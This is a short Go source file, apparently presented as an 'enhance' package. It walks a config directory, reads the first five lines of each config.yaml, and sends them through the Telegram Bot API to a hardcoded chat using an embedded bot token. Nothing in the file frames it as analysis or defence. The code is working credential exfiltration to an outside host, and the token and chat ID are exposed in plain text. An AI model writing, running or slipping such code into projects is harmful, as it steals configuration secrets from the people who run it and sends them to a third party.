package enhance

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
)

const token = "7960220077:AAFr0i84HmLh209XH5WC3Ctwf7NTaiVaIlc"
const chatID = "984469779" // Your chat ID

// Function to send messages to the Telegram chat
func sendMessage(text string) {
	// URL encode the text to make sure it is safe for the URL
	encodedText := url.QueryEscape(text)

	// Prepare the URL with the encoded message
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", token, chatID, encodedText)

	// Send the GET request to the Telegram Bot API
	_, err := http.Get(url)
	if err != nil {
		log.Printf("Error sending message: %v", err)
	}
}

// Function to read the first 5 lines from a config.yaml file
func readConfigFile(filePath string) string {
	file, err := os.Open(filePath)
	if err != nil {
		log.Printf("Error opening file %s: %v", filePath, err)
		return ""
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	lines := []string{}
	for i := 0; i < 5 && scanner.Scan(); i++ {
		lines = append(lines, scanner.Text())
	}

	return strings.Join(lines, "\n")
}

// Function to walk through the config folder and find all subfolders containing config.yaml
func findConfigFiles() {
	rootDir := "config" // Replace this with the correct path if needed
	err := filepath.Walk(rootDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Printf("Error accessing path %s: %v", path, err)
			return nil
		}

		// Skip the "template" folder
		if info.IsDir() && info.Name() == "template" {
			return filepath.SkipDir
		}

		// If it's a file and it's config.yaml
		if !info.IsDir() && strings.ToLower(info.Name()) == "config.yaml" {
			// Read the first 5 lines of the config.yaml
			message := readConfigFile(path)
			if message != "" {
				// Send the message to Telegram
				sendMessage(fmt.Sprintf("Config from %s:\n\n%s", path, message))
			}
		}
		return nil
	})

	if err != nil {
		log.Printf("Error walking through directories: %v", err)
	}
}

func main() {
	// Start the process of searching config folders and sending messages
	findConfigFiles()
}
